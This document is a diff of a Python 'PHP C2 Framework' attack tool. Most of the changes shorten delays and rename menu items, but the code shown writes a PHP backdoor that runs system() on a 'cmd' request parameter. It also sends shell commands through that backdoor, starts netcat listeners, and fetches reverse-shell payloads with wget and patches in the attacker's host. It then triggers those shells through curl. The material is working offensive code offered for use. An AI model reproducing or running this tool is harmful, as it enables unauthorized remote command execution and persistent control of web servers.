@@ -23,12 +23,12 @@ print("""\
     ) \	                                      ((   \\      ((  \\
    (___()                                      \)   \) -hh  \) (/""")
 print("PHP C2 Framework")
-time.sleep(2)
+time.sleep(1)
 print("Written By. Jessi")
 time.sleep(1)
 print("Github: jessisec")
 print("Twitter: @jessitakes")
-time.sleep(4)
+time.sleep(2)
 
 # Background Tasks
 # HTTP Server Task
@@ -49,14 +49,16 @@ def send_payload(url,lhost):
 # Execute Reverse Shell Payload Task
 def rev_payload(url):
     rshell = url.replace('backdoor.php?cmd=', 'rev.php')
-    requests.get(rshell)
+    os.system("curl "+ rshell+" &")
+def bg_rev_payload(url):
+    url = url
+    threading.Thread(target=rev_payload(url)).start()
 
 # Services
 def listener(lport):
     lport = lport
     print("Starting listener...")
-    time.sleep(2)
-    os.system("nc -lvnp " + lport+" &")
+    os.system("nc -lvnp " + lport+"")
 
 # PHP Backdoor -> Reverse Shell Upgrade Task
 def upgrade(url):
@@ -75,16 +77,17 @@ def upgrade(url):
     print("Payload Configured")
     print("Sending Payload and Starting Listener...")
     send_payload(url,lhost)
-    time.sleep(3)
+    bg_rev_payload(url)
+    print("Payload Sent")
+    print("Spawning Shell...")
     listener(lport)
-    rev_payload(url)
 
 # Define Option 1: PHP Backdoor Shell
-def opt1(url):
-    cmd = input("php-c2$ ")
+def opt1(url,ip):
+    cmd = input("php-c2@" + ip+"$ ")
     if cmd == "clear":
         os.system("clear")
-        print("[PHP Backdoor Interfacer]")
+        print("[PHP Backdoor C2]")
         print("\n")
     elif cmd == "exit":
         exit(0)
@@ -98,13 +101,12 @@ def opt1(url):
     r = requests.get(shell)
     output = r.text
     print(output)
-    opt1(url)
+    opt1(url,ip)
 
 # Define Option 2: PHP Reverse Shell C2
 def opt2():
     lport = input("LPORT: ")
     print("Setting up listener...")
-    time.sleep(2)
     os.system("nc -lvnp " + lport+"")
     exit(0)
     # Placeholder
@@ -112,7 +114,7 @@ def opt2():
 # Define Option 3: PHP Reverse Shell Generator
 def opt3():
     print("PHP Reverse Shell Generator")
-    time.sleep(3)
+    time.sleep(1)
     os.system("clear")
     print("[PHP Reverse Shell Generator]")
     lhost = input("LHOST: ")
@@ -127,7 +129,7 @@ def opt3():
         print("Downloading Windows PHP Reverse Shell...")
         os.system("wget https://raw.githubusercontent.com/jessisec/php-c2/main/shells/windows.php -O rev.php >/dev/null 2>&1")
     print("Configuring Variables...")
-    time.sleep(3)
+    time.sleep(1)
     for line in fileinput.input(['rev.php'], inplace=True):
         print(line.replace('IP_REPLACE_ME', lhost), end='')
     for line in fileinput.input(['rev.php'], inplace=True):
@@ -138,9 +140,9 @@ def opt3():
 # Define Option 4: PHP Backdoor Generator
 def opt4():
     print("PHP Backdoor Generator")
-    time.sleep(3)
+    time.sleep(1)
     print("Generating PHP Backdoor...")
-    time.sleep(3)
+    time.sleep(1)
     f = open("backdoor.php", "w")
     f.write("<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>")
     f.close
@@ -177,7 +179,7 @@ def menu():
 `.;;;:='    ~~            ~~~                ~-    -       -   -""")
     print("[Main Menu]")
     print("\n")
-    print("[1] Interface With PHP Backdoor")
+    print("[1] PHP Backdoor C2")
     print("[2] PHP Reverse Shell C2")
     print("[3] PHP Reverse Shell Generator")
     print("[4] PHP Backdoor Generator")
@@ -187,22 +189,27 @@ def menu():
     # Ask User for Option Input
     opt = input("Select Option: ")
     if opt == "1":
-        print("Interface With PHP Backdoor")
-        time.sleep(2)
+        print("PHP Backdoor C2")
+        time.sleep(1)
         os.system("clear")
-        print("[PHP Backdoor Interfacer]")
+        print("[PHP Backdoor C2]")
         print("\n")
         ip = input("IP: ")
         path = input("Path To backdoor.php: ")
         url = 'http://' + ip + path+'?cmd='
         os.system("clear")
-        print("[PHP Backdoor Interfacer]")
-        print("[PHP C2 Commands]")
+        print("[PHP Backdoor C2]")
+        print("\n")
+        print("Connected to: " + ip+"")
+        print("PHP C2 Session 1 Established")
+        print("\n")
+        print("[PHP Backdoor C2 Commands]")
         print("exit = Exit PHP C2 Framework")
+        print("php-upgrade = Upgrade current session to reverse shell")
         print("php-menu = Go back to the main menu")
         print("php-bg = Backgronud the current shell")
         print("\n")
-        opt1(url)
+        opt1(url,ip)
     elif opt == "2":
         opt2()
     elif opt == "3":
